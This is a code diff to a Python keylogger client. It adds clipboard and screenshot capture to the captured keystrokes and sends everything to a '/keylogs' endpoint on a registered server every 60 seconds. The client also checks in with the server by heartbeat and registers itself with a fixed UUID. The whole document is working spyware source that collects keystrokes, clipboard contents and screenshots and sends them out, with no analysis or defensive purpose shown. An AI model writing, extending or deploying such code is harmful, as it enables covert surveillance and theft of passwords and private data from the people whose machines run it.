@@ -9,7 +9,7 @@ from threading import Timer
 BASE_URL = "http://127.0.0.1:8000"
 UUID = "312314143312"
 HEART_BEAT = 30
-INTERVAL = 300
+INTERVAL = 60
 
 def contactServer():
     try:
@@ -41,13 +41,17 @@ def registerServer():
 def keyboardCallback(key, logs):
     logs["data"] += key
 
-def sendData(logs):
-    Timer(INTERVAL, lambda: sendData(logs)).start() #restart the timer
+def sendData(logs, logger):
+    Timer(INTERVAL, lambda: sendData(logs, logger)).start() #restart the timer
     try:
+        logs["data"] += "\n-------------Clip Board-------------\n"
+        logs["data"] += logger.clipboard()
+        logs["img"] = str(logger.screenShot().decode("utf-8"))
         res = req.post(BASE_URL+"/keylogs", json.dumps(logs))
         if res.status_code == req.codes.ok:
             logs["data"] = ""
             logs["timeStamp"] = time.time()
+            logs["img"] = None
     except req.exceptions.ConnectionError:
         return
 
@@ -55,21 +59,22 @@ if __name__ == "__main__":
     logs = {
             "timeStamp":None,
             "data":"", 
-            "UUID":UUID
+            "UUID":UUID,
+            "img":None
             }
 
     logger = keylogger.Keylogger( lambda key: keyboardCallback(key,logs) )
-    timer = Timer(INTERVAL, lambda: sendData(logs))
+    timer = Timer(INTERVAL, lambda: sendData(logs,logger))
     
+    logs["timeStamp"] = time.time()
+    logger.run()
+    timer.start()
+
     while(not contactServer()):
         sleep(HEART_BEAT)
 
     if not registerServer():
         exit()
-    
-    logs["timeStamp"] = time.time()
-    logger.run()
-    timer.start()
     
     while(True):
         pass
